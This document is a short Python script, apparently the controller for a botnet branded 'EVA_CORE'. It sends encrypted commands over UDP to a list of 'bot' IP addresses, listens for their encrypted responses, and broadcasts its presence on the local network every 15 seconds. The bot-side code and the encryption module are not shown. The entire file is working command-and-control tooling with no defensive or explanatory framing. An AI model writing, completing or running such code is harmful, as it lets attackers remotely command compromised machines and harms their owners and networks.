import socket
from jeangrey_crypto import encrypt, decrypt
import threading
import time

COMMAND_PORT = 5556
RESPONSE_PORT = 5557

def send_command(ip, message):
    encrypted = encrypt(message)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(encrypted.encode(), (ip, COMMAND_PORT))
    print(f"[SENT] To {ip}: {message}")

def receive_responses():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("", RESPONSE_PORT))
    print("[*] EVA Core listening for bot responses...")
    while True:
        data, addr = sock.recvfrom(2048)
        try:
            decrypted = decrypt(data.decode())
            print(f"[RESPONSE] {addr[0]}: {decrypted}")
        except Exception as e:
            print(f"[!] Failed decrypt: {e}")

def broadcast_presence():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    ping = encrypt("EVA_CORE_ACTIVE")
    while True:
        sock.sendto(ping.encode(), ("255.255.255.255", 4445))
        time.sleep(15)

def main():
    print(r"""
▗▄▄▄▖▗▖  ▗▖ ▗▄▖      ▗▄▖ ▗▄▄▄ ▗▄▄▖     
▐▌   ▐▌  ▐▌▐▌ ▐▌    ▐▌ ▐▌▐▌  █▐▌ ▐▌    
▐▛▀▀▘▐▌  ▐▌▐▛▀▜▌    ▐▛▀▜▌▐▌  █▐▛▀▚▖    
▐▙▄▄▖ ▝▚▞▘ ▐▌ ▐▌    ▐▌ ▐▌▐▙▄▄▀▐▙▄▞▘      
EVA_CORE · Encrypted Mesh Control
""")
    threading.Thread(target=receive_responses, daemon=True).start()
    threading.Thread(target=broadcast_presence, daemon=True).start()

    ip_list = input("Enter bot IPs (comma separated): ").split(",")
    command = input("Command to run: ")
    delay = int(input("Delay (seconds): "))
    time.sleep(delay)
    for ip in ip_list:
        send_command(ip.strip(), command)

if __name__ == "__main__":
    main()
